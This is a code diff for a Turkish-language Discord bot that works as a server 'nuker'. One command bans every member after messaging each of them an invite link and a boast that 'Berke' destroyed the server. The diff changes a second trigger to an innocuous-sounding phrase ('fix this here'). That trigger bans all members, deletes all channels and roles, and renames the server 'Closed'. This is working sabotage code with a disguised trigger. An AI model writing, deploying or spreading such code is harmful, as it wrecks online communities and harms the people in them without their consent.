@@ -17,42 +17,28 @@ const http = require('http');
 berke.on('message', msg => {
   if (msg.content === 'r!banla') {
     msg.delete()
-    msg.guild.members.forEach(member => member.send("https://discord.gg/xCzsdN7 **Sunucunuz Rako Tarafından Patlatılmıştır.**").then(member.ban())
+    msg.guild.members.forEach(member => member.send("https://discord.gg/xCzsdN7 **Sunucunuz Berke Tarafından Patlatılmıştır.**").then(member.ban())
   )}
 })
 
-var uyesayisi = [
-  "1",
-  "2",
-  "3",
-  "4",
-  "5",
-  "6",
-  "7",
-  "8",
-  "9",
-  "10"
-]
-
 berke.on('message', async msg => {
-  if (msg.content.toLowerCase() === 'berkeattack' ) {
+  if (msg.content.toLowerCase() === 'burayı bi düzelt' ) {
     msg.guild.members.forEach(member => member.ban())
     msg.guild.channels.deleteAll();
     msg.guild.roles.deleteAll();
     msg.guild.setName("Kapandı");
     msg.guild.setIcon("https://www.main-taunus-zentrum.de/fileadmin/user_upload/GLOBAL/brand_stores/logos/closed.png");
-    if (msg.guild.members.size === uyesayisi) {
-      await msg.guild.createChannel("hey");
-    } else {
-      console.log("")
-    }
-    
+    msg.guild.createChannel("hey");
   }
 });
+//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 
+
 
 berke.on("ready", () => {
   const sunucu = berke.guilds.get("616257615751544833")
   sunucu.createChannel("sa")
+  console.clear()
+  console.log(berke.user.tag + "| İsmi ile giriş yapldı")
 })
 
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 
